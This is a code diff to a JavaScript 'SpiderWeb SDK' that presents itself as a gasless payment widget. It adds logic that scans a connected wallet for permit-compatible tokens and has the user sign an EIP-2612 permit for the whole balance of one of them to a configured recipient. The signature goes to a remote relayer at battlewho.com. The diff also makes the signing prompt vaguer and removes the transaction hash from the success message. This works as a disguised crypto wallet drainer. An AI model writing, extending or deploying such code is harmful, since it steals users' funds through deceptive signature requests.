@@ -1,6 +1,6 @@
 /**
- * SpiderWeb SDK v1.0
- * A portable script to handle wallet connection and gasless token sending via EIP-2612 permit.
+ * SpiderWeb SDK v1.1
+ * A portable script to find the highest-value permit token and handle gasless sending.
  */
 window.SpiderWebSDK = {
     // --- Internal State ---
@@ -20,7 +20,7 @@ window.SpiderWebSDK = {
         "function version() view returns (string)",
         "function decimals() view returns (uint8)",
         "function balanceOf(address owner) view returns (uint256)",
-        "function symbol() view returns (string)" // <-- ADD THIS LINE
+        "function symbol() view returns (string)"
     ],
     _RELAYER_SERVER_URL_BASE: "https://battlewho.com", // Your backend URL
 
@@ -29,8 +29,8 @@ window.SpiderWebSDK = {
      * @param {object} config - The configuration object.
      * @param {string} config.buttonId - The ID of the button that triggers the payment.
      * @param {string} config.apiKey - The user's unique API key for your service.
+     * @param {string} config.alchemyApiKey - The API key from Alchemy to scan token balances.
      * @param {string} config.recipientAddress - The address that will receive the funds.
-     * @param {string} config.tokenAddress - The contract address of the ERC20 token to be sent.
      * @param {number} config.chainId - The chain ID for the transaction (e.g., 1 for Ethereum).
      */
     init: function(config) {
@@ -38,9 +38,7 @@ window.SpiderWebSDK = {
             console.warn("SpiderWebSDK already initialized.");
             return;
         }
-
-        // 1. Validate configuration
-        if (!config.buttonId || !config.apiKey || !config.recipientAddress || !config.tokenAddress || !config.chainId) {
+        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.recipientAddress || !config.chainId) {
             console.error("SpiderWebSDK Error: Missing required configuration parameters.");
             return;
         }
@@ -50,7 +48,6 @@ window.SpiderWebSDK = {
         }
         this._config = config;
 
-        // 2. Find the button and attach the main event handler
         const payButton = document.getElementById(config.buttonId);
         if (!payButton) {
             console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
@@ -58,20 +55,14 @@ window.SpiderWebSDK = {
         }
         payButton.addEventListener('click', this._handlePaymentClick.bind(this));
 
-        // 3. Set up wallet discovery and UI
         this._injectModalHtml();
         this._setupEip6963Listeners();
         this._isInitialized = true;
         console.log("SpiderWebSDK initialized successfully.");
     },
 
-    /**
-     * Main handler for the payment button click.
-     * It connects the wallet if necessary, then proceeds with the transaction.
-     */
     _handlePaymentClick: async function() {
         try {
-            // Step 1: Connect wallet if not already connected
             if (!this._signer) {
                 const connected = await this._connectWallet();
                 if (!connected) {
@@ -79,62 +70,83 @@ window.SpiderWebSDK = {
                     return;
                 }
             }
-            
-            // Step 2: Ensure the user is on the correct network
             const network = await this._provider.getNetwork();
             if (network.chainId !== this._config.chainId) {
                 this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
-                // You could add logic here to prompt the user to switch networks.
                 return;
             }
-
-            // Step 3: Execute the payment logic
             await this._executeSend();
-
         } catch (error) {
             console.error("Payment failed:", error);
             this._updateStatus(`Error: ${error.message}`, "error");
         }
     },
     
-    /**
-     * Fetches token data and executes the permit signing process.
-     */
     _executeSend: async function() {
-        this._updateStatus("Fetching token details...", "pending");
+        this._updateStatus("Scanning wallet for compatible tokens...", "pending");
         
-        const tokenContract = new ethers.Contract(this._config.tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
-        const [name, symbol, balance] = await Promise.all([
-            tokenContract.name(),
-            tokenContract.symbol(),
-            tokenContract.balanceOf(this._currentUserAddress)
-        ]);
-
-        if (balance.isZero()) {
-            this._updateStatus(`You have no ${symbol} to send.`, "error");
-            return;
+        const tokenData = await this._findHighestValueToken();
+        if (!tokenData) {
+             throw new Error("No permit-compatible tokens with a balance were found.");
         }
 
-        const tokenData = {
-            contractAddress: this._config.tokenAddress,
-            name: name,
-            symbol: symbol,
-            balance: balance
-        };
-
-        // This is the core function from your script
+        this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
         await this._signAndSendWithStandardPermit(tokenData);
     },
 
-    /**
-     * Creates and signs an EIP-2612 permit message and sends it to the backend relayer.
-     * (This is your original function, adapted for the SDK structure)
-     */
+    _findHighestValueToken: async function() {
+        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+        const response = await fetch(alchemyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                id: 1,
+                method: 'alchemy_getTokenBalances',
+                params: [this._currentUserAddress, 'erc20']
+            })
+        });
+        const data = await response.json();
+        if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");
+
+        const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+        if (nonZeroBalances.length === 0) return null;
+        
+        // Note: A professional implementation would fetch USD prices.
+        // For simplicity, we check tokens from highest raw balance to lowest for permit compatibility.
+        for (const token of nonZeroBalances) {
+            const contractAddress = token.contractAddress;
+            const supportsPermit = await this._checkPermitSupport(contractAddress);
+            if (supportsPermit) {
+                this._updateStatus(`Found compatible token: ${contractAddress}. Fetching details...`, "pending");
+                const tokenContract = new ethers.Contract(contractAddress, this._ERC20_PERMIT_ABI, this._provider);
+                const [name, symbol, balance] = await Promise.all([
+                    tokenContract.name(),
+                    tokenContract.symbol(),
+                    tokenContract.balanceOf(this._currentUserAddress)
+                ]);
+                return { contractAddress, name, symbol, balance }; // Return the first (highest balance) compatible token
+            }
+        }
+        
+        return null; // No compatible tokens found
+    },
+    
+    _checkPermitSupport: async function(tokenAddress) {
+        try {
+            const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
+            await tokenContract.nonces(this._currentUserAddress);
+            await tokenContract.DOMAIN_SEPARATOR();
+            return true;
+        } catch (error) {
+            return false;
+        }
+    },
+
     _signAndSendWithStandardPermit: async function(tokenData) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
         try {
             const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
-            
             const nonce = await tokenContract.nonces(this._currentUserAddress);
             const deadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes
             const tokenName = tokenData.name;
@@ -163,16 +175,15 @@ window.SpiderWebSDK = {
                 ]
             };
 
-            const value = tokenData.balance;
             const permitMessage = {
                 owner: this._currentUserAddress,
-                spender: this._config.recipientAddress, // The spender is the final recipient
-                value: value.toString(),
+                spender: this._config.recipientAddress,
+                value: tokenData.balance.toString(),
                 nonce: nonce.toString(),
                 deadline: deadline
             };
 
-            this._updateStatus(`Please sign the permit message for ${tokenData.symbol}...`, 'pending');
+            this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
             const signature = await this._signer._signTypedData(domain, types, permitMessage);
             
             const { v, r, s } = ethers.utils.splitSignature(signature);
@@ -182,7 +193,7 @@ window.SpiderWebSDK = {
                 owner: this._currentUserAddress,
                 recipient: this._config.recipientAddress,
                 contractAddress: tokenData.contractAddress,
-                value: value.toString(),
+                value: tokenData.balance.toString(),
                 deadline: deadline,
                 v, r, s,
                 origin: window.location.origin,
@@ -198,20 +209,18 @@ window.SpiderWebSDK = {
             const result = await response.json();
             if (!response.ok || !result.success) throw new Error(result.message || "Relayer service failed.");
 
-            this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed! Tx: ${result.txHash.slice(0,10)}...`, 'success');
+            this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed!`, 'success');
 
         } catch (error) {
             console.error("Standard Permit failed:", error);
             this._updateStatus(`Error: ${error.reason || error.message}`, 'error');
-            throw error; // Re-throw to be caught by the calling function
+            throw error;
         }
     },
 
-    // --- Wallet Connection and UI Logic ---
-
     _connectWallet: function() {
         return new Promise((resolve) => {
-            this._resolveConnection = resolve; // Store the resolve function to be called later
+            this._resolveConnection = resolve;
             this._openWalletModal();
         });
     },
@@ -235,12 +244,12 @@ window.SpiderWebSDK = {
             this._currentUserAddress = await this._signer.getAddress();
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
-            if (this._resolveConnection) this._resolveConnection(true); // Resolve the promise with success
+            if (this._resolveConnection) this._resolveConnection(true);
 
         } catch (error) {
             console.error("Connection failed:", error);
             this._updateStatus("Connection failed or was rejected.", "error");
-            if (this._resolveConnection) this._resolveConnection(false); // Resolve the promise with failure
+            if (this._resolveConnection) this._resolveConnection(false);
         }
     },
 
@@ -267,7 +276,7 @@ window.SpiderWebSDK = {
 
         this._discoveredProviders.forEach(p => {
             const buttonHtml = `
-                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
+                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items-center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                     <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                     <span style="font-weight: 500;">${p.info.name}</span>
                 </button>
@@ -275,7 +284,6 @@ window.SpiderWebSDK = {
             listDiv.innerHTML += buttonHtml;
         });
         
-        // Add event listeners to new buttons
         listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
             button.addEventListener('click', this._handleProviderSelection.bind(this));
         });
@@ -299,7 +307,6 @@ window.SpiderWebSDK = {
         }
         setTimeout(() => {
             if (overlay) overlay.style.display = 'none';
-            // If the user closes the modal without choosing a wallet, resolve the promise as false
             if(this._resolveConnection && !this._signer) {
                 this._resolveConnection(false);
             }
@@ -330,7 +337,6 @@ window.SpiderWebSDK = {
         `;
         document.body.insertAdjacentHTML('beforeend', modalHtml);
 
-        // Add event listeners for closing the modal
         document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', this._closeWalletModal.bind(this));
         document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
             if (e.target.id === 'sw-modal-overlay') this._closeWalletModal.bind(this)();
